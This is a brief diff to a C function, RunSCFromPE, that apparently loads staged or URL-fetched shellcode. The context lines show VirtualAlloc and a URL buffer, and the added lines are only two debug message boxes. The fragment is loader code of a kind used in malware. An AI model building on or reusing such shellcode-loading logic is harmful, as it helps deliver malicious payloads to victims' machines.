@@ -281,6 +281,7 @@ int RunSCFromPE(struct ConfigurationData* config)
 	{
 		if (config->shellcode[0] == P_TYPE_STAGE)
 		{
+			MessageBox(0, "1", "1", MB_OK);
 			LPVOID dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 			if (dwBaseAddr)
 			{
@@ -302,6 +303,7 @@ int RunSCFromPE(struct ConfigurationData* config)
 		}
 		else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
 		{
+			MessageBox(0, "2", "2", MB_OK);
 			unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
 			unsigned char* url = (unsigned char*)malloc(urllen + 1);
 			if (url)
